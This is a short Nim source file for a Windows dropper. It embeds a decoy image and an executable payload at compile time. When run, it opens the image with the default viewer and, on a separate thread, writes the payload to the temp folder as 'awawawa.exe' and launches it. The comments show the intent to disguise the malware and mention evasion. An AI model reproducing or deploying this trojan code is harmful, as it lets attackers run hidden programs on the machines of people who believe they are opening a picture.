import os
import osproc
import winim/com    

# Compile-time constants, this is supposed to be filled by main application, don't bother trying to pass it manually
const FileName {.strdefine.}: string = "pict.jpg"
const FilePath {.strdefine.}: string = "../pict.jpg"
const PayloadPath {.strdefine.}:string = "../payload.exe"

# Compile-time variable (?) its the content of defined file
const FileData = readFile(FilePath)
const PayloadData = readFile(PayloadPath)

# Get windows temporary folder to place our data, in advanced usage we should avoid this
# write the file data into temporary file
var tempPath = getTempDir()
if not dirExists(tempPath):
    createDir(tempPath)
writeFile(tempPath&FileName, FileData)

# payload procedure, rewrite the payload data into temporary file start it as a process
# simple as hell, too simple tbh
proc payload():void {.gcsafe.} = 
    var target = getTempDir()
    writeFile(target&"awawawa.exe", PayloadData)
    discard startProcess(target&"awawawa.exe")

# Run the file with default app
var thr:Thread[void]
createThread(thr, payload)
var WshShell = CreateObject("WScript.Shell")
WshShell.run(tempPath&FileName)
joinThreads(thr)